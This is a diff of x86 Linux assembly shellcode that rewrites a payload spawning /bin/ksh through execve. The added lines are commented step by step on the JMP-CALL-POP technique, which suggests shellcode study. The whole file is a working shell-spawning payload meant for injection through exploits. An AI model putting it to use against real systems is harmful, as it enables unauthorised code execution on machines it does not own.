@@ -1,40 +1,22 @@
 global _start
-
 section .text
 _start:
-    jmp short north
+
+        jmp short north		;We use JMP-CALL_POP technic to operate with /bin/ksh without bind to certain address
 
 south:
-    pop esi
-    mov edi,esi
+        xor eax, eax    ;We zeroed eax as we need NULL for terminated argv[] later
+        pop esi         ;esi now contains an address of /bin/ksh string
+        mov dword [esi + 8], eax	;add NULL at the end of /bin/ksh 
+        mov ebx,esi     ;mov address of /bin/ksh into ebx
 
-    xor eax,eax
-    push eax
-    mov edx,esp
-
-    push eax
-    add esp,3
-    lea esi,[esi +4]
-    xor eax,[esi]
-    push eax
-    xor eax,eax
-    xor eax,[edi]
-    push eax
-    mov ebx,esp
-
-    xor eax,eax
-    push eax
-    lea edi,[ebx]
-    push edi
-    mov ecx,esp
-
-    mov al,0xb
-    int 0x80
+        push eax        ;NULL
+	mov edx, esp	;EDX points to NULL (envp[])
+        push ebx        ;make pointer to /bin/ksh and push it into stack
+        mov ecx, esp    ;copy pointer to argv[] from stack into ecx 
+        mov    al,0xb   ;execve() code (11)
+        int    0x80     ;run syscall
 
 north:
-    call south
-    path db "/bin/ksh"	;instead of //bin/sh
-
-
-
-
+        call south		;Call initiates storing the next command address into stack, so that we store address of /bin/ksh string 
+        string db "/bin/ksh"    ;here we use a part of ksh
